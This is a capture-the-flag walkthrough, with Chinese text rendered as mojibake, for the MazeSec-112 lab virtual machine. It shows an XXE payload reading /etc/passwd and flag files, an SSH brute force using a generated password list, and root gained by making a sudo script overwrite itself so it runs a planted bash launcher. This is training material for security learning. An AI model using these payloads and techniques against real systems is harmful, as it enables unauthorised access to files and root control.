---
title: MazeSec-112
description: 'QQ Group Virtual Machine'
pubDate: 2026-01-17
image: /image/fengmian/QQ.png
categories:
  - Documentation
tags:
  - MazeSec
  - Linux Machine
---

# ä¿¡æ¯æ”¶é›†
## IPå®šä½
```plain
â”Œâ”€â”€(web)â”€(rootã‰¿kali)-[/home/kali]
â””â”€# arp-scan -l | grep "08:00:27"

192.168.0.105   08:00:27:2a:e3:6f       (Unknown)
```

## nmapæ‰«æ
```plain
â”Œâ”€â”€(web)â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -Pn -sTCV -T4 -p0-65535 192.168.0.105
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-15 23:23 EST
Nmap scan report for 192.168.0.105
Host is up (0.00025s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-title: XML Parser
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: Host: 0.0.0.112; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.11 seconds

```

## 80ç«¯å£
### ç›®å½•æ‰«æ
```plain
gobuster dir -u 192.168.0.105 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js,yaml -t 64
```

### XXEæ¼æ´
#### 192.168.0.105/index.php
å‘ç°è®©è¾“å…¥xmlä»£ç ï¼Œå°è¯•åˆ©ç”¨xxeæ¼æ´payload

##### è¯»å–/etc/passwd
```plain
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root>
    <element1>&file;</element1>
    <element2>Value2</element2>
</root>
```

æˆåŠŸè¯»å–passwd

```plain
SimpleXMLElement Object
(
    [element1] => root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
Debian-snmp:x:107:114::/var/lib/snmp:/bin/false
zabbix:x:108:115::/nonexistent:/usr/sbin/nologin

    [element2] => Value2
)
```

![](/image/qq%20group/112-1.png)

å‘ç°å­˜åœ¨ç‰¹æ®Šç”¨æˆ·tuf-è´¦å·å±æ€§æœ¬èº«å°±å¾ˆä¸æ­£å¸¸ 

tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash

###### `/etc/passwd` çš„æ ‡å‡†ç»“æ„ï¼ˆ7 ä¸ªå­—æ®µï¼‰
æ¯ä¸€è¡Œ**å¿…é¡»**æ˜¯ä¸‹é¢è¿™ä¸ªæ ¼å¼ï¼Œç”¨å†’å· `:` åˆ†éš”ï¼š

```plain
ç”¨æˆ·å : å¯†ç å ä½ç¬¦ : UID : GID : GECOS : Homeç›®å½• : Login Shell
```

| å­—æ®µ | æ­£å¸¸æƒ…å†µ | tuf çš„æƒ…å†µ | æ˜¯å¦å¼‚å¸¸ |
| --- | --- | --- | --- |
| ç”¨æˆ·å | å­—æ¯æ•°å­— | tuf | âœ… æ­£å¸¸ |
| å¯†ç å ä½ | x | x | âœ… æ­£å¸¸ |
| UID | 1000+ | 1000 | âœ… æ­£å¸¸ |
| GID | å¯¹åº”ç»„ | 1000 | âœ… æ­£å¸¸ |
| **GECOS** | äººå/æè¿° | **KQNPHFqG**JHcYJossIe** | âŒ **å¼‚å¸¸** |
| Home | `/home/xxx` | `/home/tuf` | âœ… æ­£å¸¸ |
| Shell | `/bin/bash` | `/bin/bash` | âœ… æ­£å¸¸ |


###### `/etc/passwd` çš„ GECOS æœ‰ 3 ä¸ªå¸¸è§æ¥æºï¼š
1. `adduser` æ—¶è¾“å…¥çš„å§“å
2. ç®¡ç†å‘˜éšä¾¿å¡«çš„æ³¨é‡Š
3. ç•™ç©º

ğŸ‘‰ **å‡ ä¹ä¸ä¼šæœ‰äººè¾“å…¥ä¸€ä¸²è¿™ç§å­—ç¬¦ä¸²ï¼Œé™¤éï¼š**

+ å½“ä½œ **æç¤º**
+ å½“ä½œ **å¯†ç çº¿ç´¢**
+ å½“ä½œ **flag ç‰‡æ®µ**
+ å½“ä½œ **ç¼–ç å†…å®¹**

##### è¯»å–flag
```plain
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE root [ <!ENTITY file SYSTEM "file:///home/tuf/user.txt"> ]> <root>     <element1>&file;</element1>     <element2>Value2</element2> </root>
```

```plain
SimpleXMLElement Object
(
    [element1] => flag{user-b1e12c74f19aac8e57f6fca1ff472905}

    [element2] => Value2
)
```

##### è¯»å–æºä»£ç 
```plain
<!DOCTYPE html>
<html>
<head>
    <title>XML Parser</title>
</head>
<body>
<?php
if(isset($_POST['xml'])) {
    $xml = $_POST['xml'];
    $data = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
    if($data) echo "<pre>" . htmlspecialchars(print_r($data, true)) . "</pre>";
    else echo "<pre>Parse Error</pre>";
}
?>
    <form method="POST">
        <textarea name="xml" required></textarea><br>
        <input type="submit" value="Parse XML">
    </form>
</body>
</html>

```

##### æ¼æ´æˆå› 
```plain
$data = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
```

`LIBXML_NOENT` çš„ä½œç”¨æ˜¯ï¼š

**å¯ç”¨ XML å®ä½“æ›¿æ¢ï¼ˆExpand Entitiesï¼‰**

ä¹Ÿå°±æ˜¯è¯´ï¼š

+ XML ä¸­å®šä¹‰çš„ `<!ENTITY ...>`
+ **ä¼šè¢«è‡ªåŠ¨è§£æå¹¶æ›¿æ¢ä¸ºçœŸå®å†…å®¹**



# ææƒ
æ ¹æ®passwdä¸­tufxä¸­KQNPHFqG**JHcYJossIeï¼Œæ€€ç–‘æ˜¯å¯†ç ï¼Œå°è¯•è¡¥å…¨ç™»å½•

```plain
tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash
```

å†™ä¸ªpythonè„šæœ¬è‡ªåŠ¨ç”Ÿæˆæ‰€æœ‰**å¯èƒ½(*å°è¯•å­—æ¯å’Œæ•°å­—)

```plain
import itertools
import string

template = "KQNPHFqG**JHcYJossIe"
charset = string.ascii_letters + string.digits  # a-zA-Z0-9

with open("full_password_list.txt", "w") as f:
    for a, b in itertools.product(charset, repeat=2):
        f.write(template.replace("**", a + b) + "\n")

print("Done, total:", len(charset) ** 2)
```

## sshçˆ†ç ´
```plain
â”Œâ”€â”€(web)â”€(rootã‰¿kali)-[/home/kali/Desktop/hmv]
â””â”€# medusa -h 192.168.0.105 -u tuf -P full_password_list.txt -M ssh -t 64 -n 22 -O medusa_result.txt -f

SUCCESS:KQNPHFqG6mJHcYJossIe
```

æˆåŠŸè·å–å‡­æ®tuf/KQNPHFqG6mJHcYJossIe

## sudo -l
```plain
tuf@112:~$ sudo -l
Matching Defaults entries for tuf on 112:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tuf may run the following commands
        on 112:
    (ALL) NOPASSWD: /opt/112.sh
tuf@112:~$ 
tuf@112:~$ cat /opt/112.sh 
#!/bin/bash
input_url=""
output_file=""
use_file=false
regex='^https://maze-sec.com/[a-zA-Z0-9/]*$'
while getopts ":u:o:" opt; do
    case ${opt} in
        u) input_url="$OPTARG" ;;
        o) output_file="$OPTARG"; use_file=true ;;
        \?) echo "é”™è¯¯: æ— æ•ˆé€‰é¡¹ -$OPTARG"; exit 1 ;;
        :) echo "é”™è¯¯: é€‰é¡¹ -$OPTARG éœ€è¦ä¸€ä¸ªå‚æ•°"; exit 1 ;;
    esac
done
if [[ -z "$input_url" ]]; then
    echo "é”™è¯¯: å¿…é¡»ä½¿ç”¨ -u å‚æ•°æä¾›URL"
    exit 1
fi
if [[ ! "$input_url" =~ ^https://maze-sec.com/ ]]; then
    echo "é”™è¯¯: URLå¿…é¡»ä»¥ https://maze-sec.com/ å¼€å¤´"
    exit 1
fi
if [[ ! "$input_url" =~ $regex ]]; then
    echo "é”™è¯¯: URLåŒ…å«éæ³•å­—ç¬¦ï¼Œåªå…è®¸å­—æ¯ã€æ•°å­—å’Œæ–œæ "
    exit 1
fi
if (( RANDOM % 2 )); then
    result="$input_url is a good url."
else
    result="$input_url is not a good url."
fi
if [ "$use_file" = true ]; then
    echo "$result" > "$output_file"
    echo "ç»“æœå·²ä¿å­˜åˆ°: $output_file"
else
    echo "$result"
fi

```

å¯ä»¥å†™å…¥ä»»æ„æ–‡ä»¶ ä½†å†…å®¹å›ºå®š

è¿™ä¸€æ­¥å¼€å§‹å¡ä½äº†ï¼Œæ€è·¯è·‘åäº†ï¼Œä»¥ä¸ºæ˜¯é€šè¿‡rootè®©ç³»ç»Ÿé…ç½®æ–‡ä»¶è¿›è¡Œè¦†ç›–ï¼Œæ²¡æƒ³è¿‡è¦†ç›–è‡ªèº«

### âŒ sudoers
+ è¦†ç›– `/etc/sudoers`
+ ç»“æœï¼šsudo ä¸¥æ ¼æ‹’ç»ï¼ˆDebian æ­£ç¡®è¡Œä¸ºï¼‰

### âŒ profile / bash æ‰§è¡Œ
+ `/etc/profile` å†™å…¥
+ bash å°† `https://maze-sec.com/a` è§†ä¸ºç»å¯¹è·¯å¾„å‘½ä»¤
+ PATH / alias / function å…¨éƒ¨ä¸å¯åŠ«æŒ

### âŒ PAM ç ´å
+ `/etc/pam.d/su`
+ `/etc/pam.d/common-auth`
+ ç»“æœï¼šsu é»˜è®¤æ‹’ç»ï¼ˆfail-closedï¼‰

### âŒ /etc/passwd
+ root ç”¨æˆ·æ¶ˆå¤±
+ su æ˜ç¡®æç¤º `user root does not exist`
+ æ²¡æœ‰ UID fallback

### âŒ ld.so.preload
+ setuid ç¨‹åº ç»§ç»­æ‰§è¡Œ
+ æƒé™æœªæå‡
+ glibc å¯¹ preload å¤±è´¥æ˜¯ ignore + secure-exec

## å°è¯•è¦†ç›–è‡ªèº«
```plain
tuf@112:~$ sudo /opt/112.sh -u "https://maze-sec.com/test" -o /opt/112.sh
ç»“æœå·²ä¿å­˜åˆ°: /opt/112.sh
tuf@112:~$ sudo /opt/112.sh
/opt/112.sh: 1: /opt/112.sh: https://maze-sec.com/test: not found
```

å¯ä»¥å‘ç°sudoæ‰§è¡Œåæ˜¾ç¤º[https://maze-sec.com/test:](https://maze-sec.com/test:) not found

```plain
å‘½ä»¤å: https://maze-sec.com/test
å‚æ•°: is a good url.
```

**å› ä¸º **`**/opt/112.sh**`** åœ¨æ‰§è¡Œ **`**https://maze-sec.com/test**`** æ—¶ï¼ŒShell ä¼šåœ¨ã€Œå½“å‰å·¥ä½œç›®å½•ã€æ‰¾è¿™ä¸ªè·¯å¾„ï¼Œè€Œå½“å‰ç›®å½•å°±æ˜¯ **`**~**`**ï¼ˆ**`**/home/tuf**`**ï¼‰ã€‚**

æ‰€ä»¥å¾€ `~` é‡Œå†™ã€‚

é‚£ä¹ˆé‡ç½®ä¸‹ç¯å¢ƒ

**Linux çš„è§£ææ–¹å¼ï¼š**

+ `:` â†’ æ™®é€šå­—ç¬¦
+ `/` â†’ ç›®å½•åˆ†éš”ç¬¦
+ `//` â†’ è¿ç»­çš„ `/`ï¼Œç­‰ä»·äºä¸€ä¸ª `/`

 æ‰€ä»¥ç³»ç»Ÿçœ‹åˆ°çš„æ˜¯ï¼š  

https: / maze-sec.com / test

ä¹Ÿå°±æ˜¯ç›®å½•ç»“æ„ï¼š  

```plain
https:/
â””â”€â”€ maze-sec.com/
    â””â”€â”€ test
```

æ„é€ /home/tuf/https:/maze-sec.com/test

```plain
tuf@112:~$ mkdir -p ~/https:/maze-sec.com/
tuf@112:~$ echo '#!/bin/bash' > ~/https:/maze-sec.com/test
tuf@112:~$ echo '/bin/bash' >> ~/https:/maze-sec.com/test
tuf@112:~$ chmod +x ~/https:/maze-sec.com/test
tuf@112:~$ sudo /opt/112.sh -u "https://maze-sec.com/test" -o /opt/112.sh
ç»“æœå·²ä¿å­˜åˆ°: /opt/112.sh
tuf@112:~$ sudo /opt/112.sh
root@112:/home/tuf#

root@112:/home/tuf# cat /root/root.txt
flag{root-538dc127225a0c97b060b1ff9570390a}
root@112:/home/tuf# 
```

![](/image/qq%20group/112-2.png)



